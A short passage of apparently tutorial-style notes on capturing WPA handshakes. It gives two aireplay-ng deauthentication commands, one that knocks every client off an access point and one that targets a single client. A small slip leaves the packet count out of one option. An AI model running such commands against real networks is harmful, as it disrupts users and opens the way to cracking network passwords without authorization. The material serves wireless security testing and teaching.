In order to capture the handshake packets clients will need to be deauthenticated. When clients reconnect they will resend a
handshake request.
This command sends continuous deauthentication packets to the access point, disconnecting all connected clients until manually stopped.

aireplay-ng --deauth 0 -a $ap_mac $interface

--deauth 0 can be changed to --deauth and it will only send 5 deauth packets

This will only deauthenitcate the specified client. This option is obviously less intrusive to the network

aireplay-ng --deauth 0 -a $ap_mac -c $client_mac $interface

Once a client has reconnected after a deauthentication the airodump output will show [ WPA handshake: $ap_mac]
